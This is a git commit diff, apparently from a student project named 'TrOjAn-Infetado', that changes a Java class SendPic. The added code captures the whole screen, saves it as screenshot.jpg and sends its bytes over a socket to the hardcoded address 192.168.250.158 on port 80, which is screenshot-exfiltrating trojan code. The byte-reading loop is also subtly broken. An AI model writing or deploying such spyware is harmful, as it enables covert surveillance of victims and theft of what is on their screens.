d78d721436631b0958d40d0653927c936589573c
UserPL022Pc15 <UserPL022Pc15@SLFRPL022PC15.ensino.atec.local>
2017-02-03 08:35:08 +0000

    7º commit

--- TrOjAn-Infetado/src/network/SendPic.java
+++ TrOjAn-Infetado/src/network/SendPic.java
@@ -5,32 +5,39 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
+import java.io.BufferedInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.net.Socket;
 import javax.imageio.ImageIO;
 
 public class SendPic{
     
-    DataOutputStream out;
+    DataOutputStream dos;
 
     public SendPic() throws IOException, AWTException {
 
+        Socket sock = new Socket("192.168.250.158", 80);
         Robot rob= new Robot();
         BufferedImage image = rob.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
         ImageIO.write(image, "jpg", new File("screenshot.jpg"));
-        File file = new File("screenshot.jpg");
-        FileInputStream fis =new FileInputStream(file);
+        File pic = new File("screenshot.jpg");
+        byte[] mybytearray = new byte[(int) pic.length()];
+        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(pic));
+        
             int i;
             do
             {
-                i=fis.read();
-                out.writeUTF(String.valueOf(i));
+                bis.read(mybytearray, 0, mybytearray.length);
+                i=bis.read();
+                dos = new DataOutputStream(sock.getOutputStream());
+                dos.write(mybytearray, 0, mybytearray.length);
             }
             while(i!=-1);    
-            fis.close();    
-            out.writeUTF("Screenshot recebida!");  
+            bis.close();    
+            dos.writeUTF("Screenshot recebida!");  
 
     }
 
